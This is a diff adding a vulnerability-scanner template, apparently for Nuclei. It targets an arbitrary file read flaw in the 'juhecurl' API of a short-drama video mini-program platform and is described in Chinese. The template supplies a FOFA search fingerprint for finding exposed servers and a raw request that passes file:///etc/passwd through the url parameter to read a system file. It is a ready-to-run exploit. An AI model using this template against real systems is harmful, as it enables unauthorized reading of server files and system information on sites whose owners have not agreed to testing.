@@ -1,0 +1,21 @@
+id: poc-fb4k1sr3gmth6vg5
+info:
+  name: 短剧影视小程序平台juhecur接口存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fb4k1sr3gmth6vg5'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fb4k1sr3gmth6vg5
+    fofa: '"VwmRIfEYDH.php"'
+http:
+- raw:
+  - 'GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
+
+    Accept: */*'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
